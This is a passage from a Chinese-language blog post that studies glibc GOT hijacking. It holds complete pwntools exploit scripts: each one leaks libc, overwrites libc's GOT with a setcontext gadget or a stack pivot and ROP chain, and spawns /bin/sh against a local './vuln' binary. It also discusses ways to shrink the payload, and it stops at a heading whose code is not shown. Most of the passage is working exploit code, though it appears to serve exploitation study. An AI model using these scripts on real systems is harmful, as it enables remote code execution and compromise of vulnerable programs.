class="line">    <span class="keyword">return</span> write_dest, write_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = <span class="built_in">int</span>(rl(), <span class="number">16</span>)</span><br><span class="line">logsym(leak)</span><br><span class="line">lbase = leak - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">logsym(lbase)</span><br><span class="line">libc.address = lbase</span><br><span class="line"></span><br><span class="line">dest, payload = setcontext32(</span><br><span class="line">    libc,</span><br><span class="line">    rip=libc.sym[<span class="string">&quot;execve&quot;</span>],</span><br><span class="line">    rdi=libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__(),</span><br><span class="line">    rsi=<span class="number">0</span>,</span><br><span class="line">    rdx=<span class="number">0</span>,</span><br><span class="line">)</span><br><span class="line">ss(<span class="string">&quot;write payload to &#123;&#125;, length &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(dest), <span class="built_in">hex</span>(<span class="built_in">len</span>(payload))))</span><br><span class="line">sd(p64(dest))</span><br><span class="line">sd(p64(<span class="built_in">len</span>(payload)))</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">interact()</span><br></pre></td></tr></table></figure>



<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207155109234.png"></p>
<p>这样利用需要发送0x388 bytes的payload，有没有什么方法缩短一下？请看下文。</p>
<h3 id="0x01-fx0"><a href="#0x01-fx0" class="headerlink" title="0x01. fx0"></a>0x01. fx0</h3><p>注意到在origin方案中，我们设置的context是完整的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_ucontext</span>(<span class="params">src: <span class="built_in">int</span>, rsp=<span class="number">0</span>, rbx=<span class="number">0</span>, rbp=<span class="number">0</span>, r12=<span class="number">0</span>, r13=<span class="number">0</span>, r14=<span class="number">0</span>, r15=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">                    rsi=<span class="number">0</span>, rdi=<span class="number">0</span>, rcx=<span class="number">0</span>, r8=<span class="number">0</span>, r9=<span class="number">0</span>, rdx=<span class="number">0</span>, rip=<span class="number">0</span></span>) -&gt; <span class="built_in">bytearray</span>:</span><br><span class="line">    b = flat(&#123;</span><br><span class="line">        <span class="number">0x28</span>: r8,</span><br><span class="line">        <span class="number">0x30</span>: r9,</span><br><span class="line">        <span class="number">0x48</span>: r12,</span><br><span class="line">        <span class="number">0x50</span>: r13,</span><br><span class="line">        <span class="number">0x58</span>: r14,</span><br><span class="line">        <span class="number">0x60</span>: r15,</span><br><span class="line">        <span class="number">0x68</span>: rdi,</span><br><span class="line">        <span class="number">0x70</span>: rsi,</span><br><span class="line">        <span class="number">0x78</span>: rbp,</span><br><span class="line">        <span class="number">0x80</span>: rbx,</span><br><span class="line">        <span class="number">0x88</span>: rdx,</span><br><span class="line">        <span class="number">0x98</span>: rcx,</span><br><span class="line">        <span class="number">0xA0</span>: rsp,</span><br><span class="line">        <span class="number">0xA8</span>: rip,  <span class="comment"># ret ptr</span></span><br><span class="line">        <span class="number">0xE0</span>: src,  <span class="comment"># fldenv ptr</span></span><br><span class="line">        <span class="number">0x1C0</span>: <span class="number">0x1F80</span>,  <span class="comment"># ldmxcsr</span></span><br><span class="line">    &#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>, word_size=<span class="number">64</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br></pre></td></tr></table></figure>



<p>而其实rdi前的那些寄存器就算不设置也不影响RCE。因此我们可以让context buffer和前面的内容做适当的overlap，只控制rdi后的内容就好了，这样就能省去不少空间。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">lite_context</span>(<span class="params">src: <span class="built_in">int</span>, rsp=<span class="number">0</span>, rbx=<span class="number">0</span>, rbp=<span class="number">0</span>, rsi=<span class="number">0</span>, rdi=<span class="number">0</span>, rcx=<span class="number">0</span>, rdx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">                 rip=<span class="number">0xDEADBEEF</span></span>) -&gt; <span class="built_in">bytearray</span>:</span><br><span class="line">    b = flat(&#123;</span><br><span class="line">        <span class="number">0x68</span>: rdi,</span><br><span class="line">        <span class="number">0x70</span>: rsi,</span><br><span class="line">        <span class="number">0x78</span>: rbp,</span><br><span class="line">        <span class="number">0x80</span>: rbx,</span><br><span class="line">        <span class="number">0x88</span>: rdx,</span><br><span class="line">        <span class="number">0x98</span>: rcx,</span><br><span class="line">        <span class="number">0xA0</span>: rsp,</span><br><span class="line">        <span class="number">0xA8</span>: rip,  <span class="comment"># ret ptr</span></span><br><span class="line">        <span class="number">0xE0</span>: src,  <span class="comment"># fldenv ptr</span></span><br><span class="line">        <span class="comment"># 0x1C0: 0x1F80,  # assume ldmxcsr == 0</span></span><br><span class="line">    &#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>, word_size=<span class="number">64</span>)[<span class="number">0x68</span>:]</span><br><span class="line">    <span class="keyword">return</span> b</span><br></pre></td></tr></table></figure>

<p>注意到我们去掉了对offset 0x1C0值的设置，只要里面的值是0就没事。我们可以通过提前分析glibc来规避。</p>
<p>例如在我们实验环境中的glibc中，如果不做偏移，offset 0x1C0刚好在这里：</p>
<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207155810000.png"></p>
<p>所以我们可以offset +8，从而让offset 0x1C0落在<code>0x219328</code>。</p>
<ul>
<li>完整代码：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.35.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">x</span>): <span class="keyword">return</span> x.encode(<span class="string">&#x27;latin1&#x27;</span>) <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">str</span>) <span class="keyword">else</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.send(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.sendline(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendlineafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rv</span>(<span class="params">x=<span class="number">0x1000</span></span>): <span class="keyword">return</span> cn.recv(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> cn.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.recvuntil(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddr</span>(): <span class="keyword">return</span> u64(cn.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddrn</span>(<span class="params">x</span>): <span class="keyword">return</span> u64(rv(x).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interact</span>(): <span class="keyword">return</span> cn.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ss</span>(<span class="params">s</span>): <span class="keyword">return</span> success(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logsym</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> inspect.getframeinfo(inspect.currentframe().f_back)[<span class="number">3</span>]:</span><br><span class="line">        m = re.search(<span class="string">r&#x27;\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        varname = m.group(<span class="number">1</span>)</span><br><span class="line">        ss(<span class="string">f&quot;<span class="subst">&#123;varname&#125;</span> =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(val)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ss(<span class="built_in">hex</span>(val))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lite_context</span>(<span class="params">src: <span class="built_in">int</span>, rsp=<span class="number">0</span>, rbx=<span class="number">0</span>, rbp=<span class="number">0</span>, rsi=<span class="number">0</span>, rdi=<span class="number">0</span>, rcx=<span class="number">0</span>, rdx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">                 rip=<span class="number">0xDEADBEEF</span></span>) -&gt; <span class="built_in">bytearray</span>:</span><br><span class="line">    b = flat(&#123;</span><br><span class="line">        <span class="number">0x68</span>: rdi,</span><br><span class="line">        <span class="number">0x70</span>: rsi,</span><br><span class="line">        <span class="number">0x78</span>: rbp,</span><br><span class="line">        <span class="number">0x80</span>: rbx,</span><br><span class="line">        <span class="number">0x88</span>: rdx,</span><br><span class="line">        <span class="number">0x98</span>: rcx,</span><br><span class="line">        <span class="number">0xA0</span>: rsp,</span><br><span class="line">        <span class="number">0xA8</span>: rip,  <span class="comment"># ret ptr</span></span><br><span class="line">        <span class="number">0xE0</span>: src,  <span class="comment"># fldenv ptr</span></span><br><span class="line">        <span class="comment"># 0x1C0: 0x1F80,  # assume ldmxcsr == 0</span></span><br><span class="line">    &#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>, word_size=<span class="number">64</span>)[<span class="number">0x68</span>:]</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fx0</span>(<span class="params">libc: ELF, nudge=<span class="number">8</span>, **kwargs</span>) -&gt; (<span class="built_in">int</span>, <span class="built_in">bytes</span>):</span><br><span class="line">    <span class="comment"># nudge is used to make sure ldmxcsr == 0,</span></span><br><span class="line">    <span class="comment"># aka [got + 8 + 0x10 + got_count * 8 - 0x68 + nudge + 0x1c0] == 0</span></span><br><span class="line">    got = libc.address + libc.dynamic_value_by_tag(<span class="string">&quot;DT_PLTGOT&quot;</span>)</span><br><span class="line">    plt0 = libc.address + libc.get_section_by_name(</span><br><span class="line">        <span class="string">&quot;.plt&quot;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    write_dest = got + <span class="number">8</span></span><br><span class="line">    got_count = <span class="number">0x36</span>  <span class="comment"># hardcoded</span></span><br><span class="line">    context_dest = write_dest + <span class="number">0x10</span> + got_count * <span class="number">8</span> - <span class="number">0x68</span> + nudge</span><br><span class="line">    warn(<span class="string">&quot;make sure [libc.address + 0x&#123;:x&#125; (0x&#123;:x&#125;)] == 0&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        context_dest + <span class="number">0x1c0</span> - libc.address,</span><br><span class="line">        context_dest + <span class="number">0x1c0</span></span><br><span class="line">    ))</span><br><span class="line">    write_data = flat(</span><br><span class="line">        context_dest,</span><br><span class="line">        libc.symbols[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">32</span>,</span><br><span class="line">        [plt0] * got_count,</span><br><span class="line">        <span class="string">b&#x27;\x00&#x27;</span> * nudge,</span><br><span class="line">        lite_context(context_dest, rsp=libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>,</span><br><span class="line">                     **kwargs),</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> write_dest, write_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = <span class="built_in">int</span>(rl(), <span class="number">16</span>)</span><br><span class="line">logsym(leak)</span><br><span class="line">lbase = leak - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">logsym(lbase)</span><br><span class="line">libc.address = lbase</span><br><span class="line"></span><br><span class="line">dest, payload = fx0(</span><br><span class="line">    libc,</span><br><span class="line">    rip=libc.sym[<span class="string">&quot;execve&quot;</span>],</span><br><span class="line">    rdi=libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__(),</span><br><span class="line">    rsi=<span class="number">0</span>,</span><br><span class="line">    rdx=<span class="number">0</span>,</span><br><span class="line">)</span><br><span class="line">ss(<span class="string">&quot;write payload to &#123;&#125;, length &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(dest), <span class="built_in">hex</span>(<span class="built_in">len</span>(payload))))</span><br><span class="line">sd(p64(dest))</span><br><span class="line">sd(p64(<span class="built_in">len</span>(payload)))</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">interact()</span><br></pre></td></tr></table></figure>



<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207155942859.png"></p>
<p>这样利用需要发送0x248 bytes的payload，有没有什么方法再缩短一下？请看下文。</p>
<h3 id="0x02-fx1"><a href="#0x02-fx1" class="headerlink" title="0x02. fx1"></a>0x02. fx1</h3><p>上文我们是使用setcontext gadget来设置寄存器，这样的代价就是context buffer非常大。其实我们也完全可以通过ROP来做到这点。</p>
<p>将GOT1设置为gadget <code>pop rsp; ret</code>，然后将GOT0设置为GOT下面一点的位置，然后再里面布置好ROP chain即可。</p>
<p>完整代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.35.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">x</span>): <span class="keyword">return</span> x.encode(<span class="string">&#x27;latin1&#x27;</span>) <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">str</span>) <span class="keyword">else</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.send(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.sendline(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendlineafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rv</span>(<span class="params">x=<span class="number">0x1000</span></span>): <span class="keyword">return</span> cn.recv(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> cn.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.recvuntil(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddr</span>(): <span class="keyword">return</span> u64(cn.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddrn</span>(<span class="params">x</span>): <span class="keyword">return</span> u64(rv(x).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interact</span>(): <span class="keyword">return</span> cn.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ss</span>(<span class="params">s</span>): <span class="keyword">return</span> success(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logsym</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> inspect.getframeinfo(inspect.currentframe().f_back)[<span class="number">3</span>]:</span><br><span class="line">        m = re.search(<span class="string">r&#x27;\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        varname = m.group(<span class="number">1</span>)</span><br><span class="line">        ss(<span class="string">f&quot;<span class="subst">&#123;varname&#125;</span> =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(val)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ss(<span class="built_in">hex</span>(val))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ROPgadget</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, libc: ELF, base=<span class="number">0</span></span>):</span><br><span class="line">        <span class="keyword">if</span> Path(<span class="string">&quot;./gadgets&quot;</span>).exists():</span><br><span class="line">            <span class="built_in">print</span>(</span><br><span class="line">                <span class="string">&quot;[!] Using gadgets, make sure that&#x27;s corresponding to the libc!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fp = <span class="built_in">open</span>(<span class="string">&quot;./gadgets&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            subprocess.run(<span class="string">f&quot;ROPgadget --binary <span class="subst">&#123;libc.path&#125;</span>&quot;</span>.split(<span class="string">&quot; &quot;</span>),</span><br><span class="line">                           stdout=fp)</span><br><span class="line">            fp.close()</span><br><span class="line">        fp = <span class="built_in">open</span>(<span class="string">&quot;./gadgets&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        data = fp.readlines()[<span class="number">2</span>:-<span class="number">2</span>]</span><br><span class="line">        data = [x.strip().split(<span class="string">b&quot; : &quot;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> data]</span><br><span class="line">        data = [[<span class="built_in">int</span>(x[<span class="number">0</span>], <span class="number">16</span>), x[<span class="number">1</span>].decode()] <span class="keyword">for</span> x <span class="keyword">in</span> data]</span><br><span class="line">        fp.close()</span><br><span class="line">        self.gadgets = data</span><br><span class="line">        self.base = base</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self, s</span>):</span><br><span class="line">        <span class="keyword">for</span> addr, ctx <span class="keyword">in</span> self.gadgets:</span><br><span class="line">            <span class="keyword">if</span> ctx == s:</span><br><span class="line">                <span class="keyword">return</span> addr + self.base</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fx1</span>(<span class="params">libc: ELF, rop_chain</span>):</span><br><span class="line">    got = libc.address + libc.dynamic_value_by_tag(<span class="string">&quot;DT_PLTGOT&quot;</span>)</span><br><span class="line">    plt0 = libc.address + libc.get_section_by_name(<span class="string">&quot;.plt&quot;</span>).header.sh_addr</span><br><span class="line">    pivot = rop.find_gadget([<span class="string">&quot;pop rsp&quot;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">    write_dest = got + <span class="number">8</span></span><br><span class="line">    got_count = <span class="number">0x36</span>  <span class="comment"># hardcoded</span></span><br><span class="line">    rop_dest = write_dest + <span class="number">0x10</span> + got_count * <span class="number">8</span></span><br><span class="line">    write_data = flat(</span><br><span class="line">        rop_dest,</span><br><span class="line">        pivot,</span><br><span class="line">        [plt0] * got_count,</span><br><span class="line">        rop_chain</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> write_dest, write_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = <span class="built_in">int</span>(rl(), <span class="number">16</span>)</span><br><span class="line">logsym(leak)</span><br><span class="line">lbase = leak - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">logsym(lbase)</span><br><span class="line">libc.address = lbase</span><br><span class="line"></span><br><span class="line">rop = ROP(libc)</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&quot;pop rdi&quot;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rsi = rop.find_gadget([<span class="string">&quot;pop rsi&quot;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdx = rop.find_gadget([<span class="string">&quot;pop rdx&quot;</span>, <span class="string">&quot;pop r12&quot;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rop_chain = flat(</span><br><span class="line">    rdi, libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__(),</span><br><span class="line">    rsi, <span class="number">0</span>,</span><br><span class="line">    rdx, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">)</span><br><span class="line">dest, payload = fx1(libc, rop_chain=rop_chain)</span><br><span class="line"></span><br><span class="line">ss(<span class="string">&quot;write payload to &#123;&#125;, length &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(dest), <span class="built_in">hex</span>(<span class="built_in">len</span>(payload))))</span><br><span class="line">sd(p64(dest))</span><br><span class="line">sd(p64(<span class="built_in">len</span>(payload)))</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">interact()</span><br></pre></td></tr></table></figure>



<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207160329936.png"></p>
<p>这样利用需要发送0x200 bytes的payload，有没有什么方法再缩短一下？请看下文。</p>
<h3 id="0x03-fx2"><a href="#0x03-fx2" class="headerlink" title="0x03. fx2"></a>0x03. fx2</h3><p>上面这样ROP有个问题，为了让payload尽可能短，我们放ROP的位置其实离GOT0很近，而GOT0的低地址处就是ro page和rw page的交界处。而stack是向低地址生长的，因此我们我们调用<code>system</code>这样的函数，rsp很容易一不小心就顶到头从而崩溃。</p>
<p>为了调用system从而缩短payload，我们可以做两次栈迁移。大致思路如下：</p>
<ol>
<li>调用 <code>pop rsp; ret</code> 将栈迁移到GOT中的ROP gadget处</li>
<li>调用 <code>pop rdi; ret</code>设置rdi到”&#x2F;bin&#x2F;sh”</li>
<li>调用<code>pop rax; ret</code>设置rax到system</li>
<li>调用gadget<code>pop rsp; .*jmp rax</code>完成二次栈迁移且跳转到system完成利用</li>
</ol>
<ul>
<li>完整代码：</li>
</ul>
